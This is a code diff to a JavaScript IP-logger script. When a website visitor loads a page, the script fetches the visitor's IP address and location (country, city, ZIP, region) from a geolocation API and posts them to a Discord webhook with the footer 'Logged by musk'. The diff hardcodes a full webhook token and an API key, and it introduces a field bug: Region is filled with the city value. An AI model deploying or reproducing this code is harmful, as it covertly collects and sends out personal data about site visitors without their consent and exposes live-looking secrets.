@@ -1,12 +1,11 @@
-const a = "nPteRQXNw11pyinS-wqEhxcWEAPsy9qxl0qdWHQPbNHa97V_z8JUNUYDLu4LMBrggb_W"
-const webhook = "https://discord.com/api/webhooks/1073586834787012749/"+a
+const webhook = "https://discord.com/api/webhooks/1073586834787012749/nPteRQXNw11pyinS-wqEhxcWEAPsy9qxl0qdWHQPbNHa97V_z8JUNUYDLu4LMBrggb_W"
 
 async function IP_Info(){
     /**
      *  
      *  @return {fetch.Body.json()} 
      */
-    let response = await fetch("http://ip-api.com/json", {
+    let response = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=f7be41fa49dc4dd7a9e362d73cc193d1&", {
       method: 'GET',
       headers: {
         "cache-control" : "no-cache",
@@ -17,7 +16,7 @@ async function IP_Info(){
   }
   IP_Info().then((value)=> {
     let requiredInfo = [
-      "status","country", "city", "zip", "regionName"
+      "country_name", "city", "zipcode", "city"
     ]
     let noData = false
 
@@ -46,23 +45,23 @@ async function IP_Info(){
               color: "12223968",
               description: "```IP information of the recent website visitor.```",
               fields: [{
-                name: "IP", value: `${value.query}`, inline: false
+                name: "IP", value: `${value.ip}`, inline: false
               },
               {
-                name: "Country", value: `${value.country}`, inline: false
+                name: "Country", value: `${value.country_name}`, inline: false
               },
               {
                 name: "City", value: `${value.city}`, inline: false
               },
               {
-                name: "ZIP", value: `${value.zip}`, inline: false
+                name: "ZIP", value: `${value.zipcode}`, inline: false
               },
               {
-                name: "Region", value: `${value.regionName}`, inline: false
+                name: "Region", value: `${value.city}`, inline: false
               }
               ],
               footer: {
-                text: "Logged by musk",
+                text: "Logged by musk :)",
                 icon_url: "https://avatars.githubusercontent.com/u/62134419?v=4"
               },
               author: {
